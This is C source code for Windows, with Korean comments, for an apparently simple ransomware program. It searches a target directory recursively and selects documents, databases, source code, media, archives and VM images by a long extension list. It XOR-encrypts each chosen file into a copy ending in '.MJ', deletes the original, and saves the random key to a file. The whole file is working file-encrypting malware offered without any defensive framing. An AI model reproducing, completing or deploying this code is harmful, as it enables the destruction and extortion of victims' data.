#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>
#include <Windows.h>
#include <time.h>
#define MAX 1000000
struct _finddata_t fd;
int rand_key;

void Encoding(char *name, unsigned int size)
{
	FILE *fp_old, *fp_new;
	char data[MAX];
	char key[101] = { "Y#DwGZ#jYbZz*-@py_y3Jr+Uz3g7T9nBP2cFNb8cU8U_m_hxRfLNsP2Qmv@!XTqca$LM6s5N5JV$5qahLpe74x*J4NA6Zq#VdnFh" };
	int i;

	fp_old = fopen(name, "rb");
	fp_new = fopen(strcat(name, ".MJ"), "wb");

	fread(data, sizeof(char), size, fp_old);
	for (i = 0; i < size; i++)
	{
		data[i] ^= key[i % (rand_key % 100)];
	}
	fwrite(data, sizeof(char), size, fp_new);

	fclose(fp_old);
	fclose(fp_new);

	strcpy(strstr(name, ".MJ"), "\0");
	remove(name);

	fputs("암호화 완료!\n", stdout);

	return;
}

int isFileOrDir(char* str)
{
	struct _finddatai64_t c_file;
	intptr_t hFile;
	int result;

	if ((hFile = _findfirsti64(str, &c_file)) == -1L) result = -1; // 파일 또는 디렉토리가 없으면 -1 반환

	else if (c_file.attrib & _A_SUBDIR) result = 0; // 디렉토리면 0 반환

	else result = 1; // 그밖의 경우는 "존재하는 파일"이기에 1 반환

	_findclose(hFile);

	return result;
}

int Extension(char *str)
{
	if (strstr(str, ".std") != 0 || strstr(str, ".uop") != 0 || strstr(str, ".odg") != 0 || strstr(str, ".otg") != 0 || strstr(str, ".sxm") != 0 || strstr(str, ".mml") != 0 || strstr(str, ".lay") != 0 || strstr(str, ".lay6") != 0 || strstr(str, ".asc") != 0 || strstr(str, ".sqlite3") != 0 || strstr(str, ".sqllitedb") != 0 || strstr(str, ".sql") != 0 || strstr(str, ".accdb") != 0 || strstr(str, ".mdb") != 0 || strstr(str, ".db") != 0 || strstr(str, ".dbf") != 0 || strstr(str, ".odb") != 0 || strstr(str, ".frm") != 0 || strstr(str, ".myd") != 0 || strstr(str, ".myi") != 0 || strstr(str, ".ibd") != 0 || strstr(str, ".mdf") != 0 || strstr(str, ".ldf") != 0 || strstr(str, ".sln") != 0 || strstr(str, ".suo") != 0 || strstr(str, ".cs") != 0 || strstr(str, ".c") != 0 || strstr(str, ".cpp") != 0 || strstr(str, ".pas") != 0 || strstr(str, ".h") != 0 || strstr(str, ".asm") != 0 || strstr(str, ".js") != 0 || strstr(str, ".cmd") != 0 || strstr(str, ".bat") != 0 || strstr(str, ".ps1") != 0 || strstr(str, ".vbs") != 0 || strstr(str, ".vb") != 0 || strstr(str, ".pl") != 0 || strstr(str, ".dip") != 0 || strstr(str, ".dch") != 0 || strstr(str, ".sch") != 0 || strstr(str, ".brd") != 0 || strstr(str, ".jsp") != 0 || strstr(str, ".php") != 0 || strstr(str, ".asp") != 0 || strstr(str, ".rb") != 0 || strstr(str, ".java") != 0 || strstr(str, ".jar") != 0 || strstr(str, ".class") != 0 || strstr(str, ".sh") != 0 || strstr(str, ".mp3") != 0 || strstr(str, ".wav") != 0 || strstr(str, ".swf") != 0 || strstr(str, ".fla") != 0 || strstr(str, ".wmv") != 0 || strstr(str, ".mpg") != 0 || strstr(str, ".vob") != 0 || strstr(str, ".mpeg") != 0 || strstr(str, ".asf") != 0 || strstr(str, ".fla") != 0 || strstr(str, ".wmv") != 0 || strstr(str, ".mpg") != 0 || strstr(str, ".vob") != 0 || strstr(str, ".mpeg") != 0 || strstr(str, ".asf") != 0 || strstr(str, ".avi") != 0 || strstr(str, ".mov") != 0 || strstr(str, ".mp4") != 0 || strstr(str, ".3gp") != 0 || strstr(str, ".mkv") != 0 || strstr(str, ".3g2") != 0 || strstr(str, ".flv") != 0 || strstr(str, ".wma") != 0 || strstr(str, ".mid") != 0 || strstr(str, ".m3u") != 0 || strstr(str, ".m4u") != 0 || strstr(str, ".djvu") != 0 || strstr(str, ".svg") != 0 || strstr(str, ".ai") != 0 || strstr(str, ".psd") != 0 || strstr(str, ".nef") != 0 || strstr(str, ".tiff") != 0 || strstr(str, ".tif") != 0 || strstr(str, ".cgm") != 0 || strstr(str, ".raw") != 0 || strstr(str, ".gif") != 0 || strstr(str, ".png") != 0 || strstr(str, ".bmp") != 0 || strstr(str, ".jpg") != 0 || strstr(str, ".jpeg") != 0 || strstr(str, ".vcd") != 0 || strstr(str, ".iso") != 0 || strstr(str, ".backup") != 0 || strstr(str, ".zip") != 0 || strstr(str, ".rar") != 0 || strstr(str, ".7z") != 0 || strstr(str, ".gz") != 0 || strstr(str, ".tgz") != 0 || strstr(str, ".tar") != 0 || strstr(str, ".bak") != 0 || strstr(str, ".tbk") != 0 || strstr(str, ".bz2") != 0 || strstr(str, ".PAQ") != 0 || strstr(str, ".ARC") != 0 || strstr(str, ".aes") != 0 || strstr(str, ".gpg") != 0 || strstr(str, ".vmx") != 0 || strstr(str, ".vmdk") != 0 || strstr(str, ".vdi") != 0 || strstr(str, ".sldm") != 0 || strstr(str, ".sldx") != 0 || strstr(str, ".sti") != 0 || strstr(str, ".sxi") != 0 || strstr(str, ".602") != 0 || strstr(str, ".hwp") != 0 || strstr(str, ".snt") != 0 || strstr(str, ".onetoc2") != 0 || strstr(str, ".dwg") != 0 || strstr(str, ".pdf") != 0 || strstr(str, ".wk1") != 0 || strstr(str, ".wks") != 0 || strstr(str, ".123") != 0 || strstr(str, ".rtf") != 0 || strstr(str, ".csv") != 0 || strstr(str, ".txt") != 0 || strstr(str, ".vsdx") != 0 || strstr(str, ".vsd") != 0 || strstr(str, ".edb") != 0 || strstr(str, ".eml") != 0 || strstr(str, ".msg") != 0 || strstr(str, ".ost") != 0 || strstr(str, ".pst") != 0 || strstr(str, ".potm") != 0 || strstr(str, ".potx") != 0 || strstr(str, ".ppam") != 0 || strstr(str, ".ppsx") != 0 || strstr(str, ".ppsm") != 0 || strstr(str, ".pps") != 0 || strstr(str, ".pot") != 0 || strstr(str, ".pptm") != 0 || strstr(str, ".pptx") != 0 || strstr(str, ".ppt") != 0 || strstr(str, ".xltm") != 0 || strstr(str, ".xltx") != 0 || strstr(str, ".xlc") != 0 || strstr(str, ".xlm") != 0 || strstr(str, ".xlt") != 0 || strstr(str, ".xlw") != 0 || strstr(str, ".xlsb") != 0 || strstr(str, ".xlsm") != 0 || strstr(str, ".xlsx") != 0 || strstr(str, ".xls") != 0 || strstr(str, ".dotx") != 0 || strstr(str, ".dotm") != 0 || strstr(str, ".dot") != 0 || strstr(str, ".docm") != 0 || strstr(str, ".docb") != 0 || strstr(str, ".docx") != 0 || strstr(str, ".doc") != 0)
		return 0;

	else if (strstr(str, ".MJ") != 0)
		return -1;
}


int FileSearch(char *file_path)
{
	int result = 1;
	long handle;
	int check = 0;
	char file_path2[_MAX_PATH];

	strcat(file_path, "\\");
	strcpy(file_path2, file_path);
	strcat(file_path, "*");

	handle = _findfirst(file_path, &fd);

	while (result != -1)
	{
		char file_pt[_MAX_PATH];
		strcpy(file_pt, file_path2);
		strcat(file_pt, fd.name);

		check = isFileOrDir(file_pt);

		if (check == 0 && fd.name[0] != '.')
		{
			FileSearch(file_pt);
			result = _findnext(handle, &fd);
		}

		else if (check == 1 && fd.size < MAX && fd.name[0] != '.')
		{
			if (Extension(file_pt) == 0)
			{
				fputs(file_pt, stdout);
				Encoding(file_pt, fd.size);
			}
			result = _findnext(handle, &fd);
		}
		else
		{
			if (handle == -1)
			{
				if (Extension(file_pt) == 0)
				{
					fputs(file_pt, stdout);
					Encoding(file_pt, fd.size);
				}
				perror("Error - ");
				result = -1;
			}
			else result = _findnext(handle, &fd);
		}
	}

	result = 1;
	return 0;
}

int main()
{
	FILE *KEY;
	char file_path[_MAX_PATH] = "<Target_Path>"; // 암호화 대상 디렉토리

	srand(time(NULL));
	rand_key = rand();

	FileSearch(file_path);

	KEY = fopen("<Target_Path>", "wb"); // Key가 있는 위치
	fwrite(&rand_key, sizeof(int), 1, KEY);
	fclose(KEY);

	getchar();

	return 0;
}
